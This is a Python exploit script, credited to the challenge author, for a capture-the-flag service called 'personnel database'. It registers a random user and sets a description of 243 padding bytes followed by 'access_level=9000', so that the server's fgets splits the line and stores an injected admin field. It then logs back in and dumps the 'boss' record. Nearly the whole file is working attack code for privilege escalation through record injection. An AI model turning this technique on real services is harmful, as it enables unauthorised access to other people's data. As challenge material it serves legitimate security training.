#!/usr/bin/env python3
import socket
import sys
import random
import string

# exploit for "personnel database" by TheJH (challenge author)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))

def randomword():
   return ''.join(random.choice(string.ascii_lowercase) for i in range(20))

def expect(bstr):
  resp = s.recv(len(bstr), socket.MSG_WAITALL)
  if resp != bstr:
    print('expected {0}, but got {1}'.format(bstr, resp))
    sys.exit(1)
  print('got {0} as expected'.format(resp))

def dumpline():
  line = b''
  while True:
    char = s.recv(1)
    if len(char) == 0:
      sys.exit(1)
    line += char
    if char == b'\n':
      print(line.decode('ascii'))
      return

username = randomword().encode('ascii')
password = randomword().encode('ascii')

expect(b'> ')
s.send(b'register '+username+b':'+password+b'\n')
expect(b'user created successfully\n> ')
# this is the trick: when the server reads the account file back in,
# one fgets will stop reading in the middle of the line because the
# buffer is full, and the next one will start reading at "access_level=9000"
s.send(b'set_description ' + b'a'*243 + b'access_level=9000\n')
expect(b'description set\n> ')
s.send(b'logout\n')
expect(b'Uh, who are you again? I have forgotten.\n> ')
s.send(b'user '+username+b'\n')
expect(b'username accepted, please provide password\n> ')
s.send(b'pass '+password+b'\n')
expect(b'login ok\n> ')
s.send(b'whois boss\n')
for i in range(0, 3): dumpline()
